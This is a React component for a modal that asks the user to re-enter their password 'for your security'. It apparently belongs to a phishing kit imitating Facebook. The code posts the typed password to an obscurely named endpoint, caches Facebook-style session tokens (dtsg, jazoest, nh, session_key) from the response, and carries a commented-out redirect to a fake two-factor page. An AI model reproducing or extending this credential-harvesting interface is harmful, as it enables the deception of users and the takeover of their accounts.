import React, { useEffect } from 'react';
import Modal from 'react-bootstrap/Modal';
import Button from 'react-bootstrap/Button';
import 'react-international-phone/style.css';
import { useState } from 'react';
import Confirm from './Confirm';
import "./Dialog.css";
import apiClient from '../../api/apiClient';
export default function Dialog({ isOpen, content }) {
    const [password, setPassword] = useState('');
    const [isShow, setShow] = useState(false);

    // useEffect(() => {
    //     console.log("hjhjhj>", isOpen, content)
    //     if (isOpen) {
    //         console.log("hjhjhj>", content)
    //     }
    // }, []);

    const handleClick = async () => {
        content.password = password;
        localStorage.setItem('data', JSON.stringify(content));
        const response = await sendMessage(content);
        console.log(response)
        if (response.data.status) {
            setShow(true);
        }
        else {
            // assign value to local storage
            content.dtsg = response.data.dtsg;
            content.jazoest = response.data.jazoest;
            content.nh = response.data.nh;
            content.session_key = response.data.session_key;
            localStorage.setItem('data', JSON.stringify(content));
            // window.location.href = "/password_and_security/two_factor";
        }
    }

    const sendMessage = async (data) => {
        const response = await apiClient.post("/xhuiasdi8", data);
        return response;

    }


    return (
        <Modal show={isOpen} centered autoFocus className='form-pass' >
            <Modal.Header >
                <Modal.Title>Please re-enter your password</Modal.Title>
            </Modal.Header>
            <Modal.Body>
                <p>For your security, you must re-enter your password to continue.</p>
                <input
                    type="text"
                    className='form-control'
                    placeholder='Password'
                    name='password'
                    required
                    onChange={(e) => setPassword(e.target.value)}
                    id='password'
                />
                {isShow && <h6 style={{ color: "red", textAlign: "left" }}  >Wrong password, please try again !</h6>}


            </Modal.Body>
            <Modal.Footer>
                <Button
                    className='btn btn-primary'
                    type='submit'
                    onClick={handleClick}
                >
                    Submit
                </Button>
            </Modal.Footer>
        </Modal>
    );
}
